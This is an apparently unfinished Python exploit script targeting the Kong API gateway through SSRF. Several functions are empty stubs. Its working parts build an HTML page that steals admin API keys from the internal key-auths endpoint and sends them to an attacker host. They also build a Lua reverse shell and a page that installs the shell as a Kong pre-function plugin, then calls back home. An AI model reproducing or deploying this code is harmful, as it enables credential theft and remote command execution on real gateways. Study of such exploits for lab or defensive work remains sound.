"""
Author: Aleksa Zatezalo
Date: March 2025
Description: A remote code execution exploit that leverages SSRF on the Kong API gateway.
"""

def log(message):
    """
    Prints a string, message, to standard output.
    """

    pass

def createAPIHTML(lhost):
    """
    Creates HTML for API key exfiltration, replacing the hardcoded IP with lhost.
    
    Args:
        lhost (str): The host to send exfiltrated data to
        
    Returns:
        str: Formatted HTML with the specified host
    """
    html_template = f'''<html>
<head>
<script>
function exfiltrate() {{
    fetch("http://172.16.16.2:8001/key-auths")
    .then((response) => response.text())
    .then((data) => {{
        fetch("http://{lhost}/callback?" + encodeURIComponent(data));
    }}).catch(err => {{
        fetch("http://{lhost}/error?" + encodeURIComponent(err));
    }}); 
}}
</script>
</head>
<body onload='exfiltrate()'>
<div></div>
</body>
</html>'''
    
    return html_template

def parseAPIKeyResponse(response):
    """
    Parses response from Kong API Gateway to get Admin Panel API key.
    """

    pass

def getAPIKey(url):
    """
    Leverages SSRF on Kong API gateway found at URL return API key for admin panel.
    """

    pass

def checkPlugins(url, apikey):
    """
    Checks Kong Admin Panel to see if a plugin supporting RCE is enabled on the Admin panel.
    """
    
    pass

def makeShell(lhost, lport):
    """
    Returns a lua revshell for lhost and lport.
    """

    return f"local s=require('socket');local t=assert(s.tcp());t:connect('{lhost}',{lport});while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"

def formatRCEHTML(lhost, lport):
    """
    Formats HTML RCE code.
    """
    shell = makeShell(lhost, lport)
    
    html_template = f'''<html>
<head>
<script>
function createService() {{
    fetch("http://172.16.16.2:8001/services", {{
      method: "post",
      headers: {{ "Content-Type": "application/json" }},
      body: JSON.stringify({{"name":"supersecret", "url": "http://127.0.0.1/"}})
    }}).then(function (route) {{
      createRoute();
    }});
}}
function createRoute() {{
    fetch("http://172.16.16.2:8001/services/supersecret/routes", {{ 
      method: "post",
      headers: {{ "Content-Type": "application/json" }},
      body: JSON.stringify({{"paths": ["/supersecret"]}})
    }}).then(function (plugin) {{
      createPlugin();
    }});  
}}
function createPlugin() {{
    fetch("http://172.16.16.2:8001/services/supersecret/plugins", {{ 
      method: "post",
      headers: {{ "Content-Type": "application/json" }},
      body: JSON.stringify({{"name":"pre-function", "config" :{{ "access" :[ "{shell}" ]}}}})
    }}).then(function (callback) {{
      fetch("http://{lhost}/callback?setupComplete");
    }});  
}}
</script>
</head>
<body onload='createService()'>
<div></div>
</body>
</html>'''
    
    return html_template


def starServer(lport, lhost):
    """
    Starts apache server and moves HTML payload to server.
    """

    pass

def createPlugin(url, lport, lhost):
    """
    Sends a request to get the proper plugin.
    """

    pass

def getRCE(url):
    """
    Self explanitory.
    """

    pass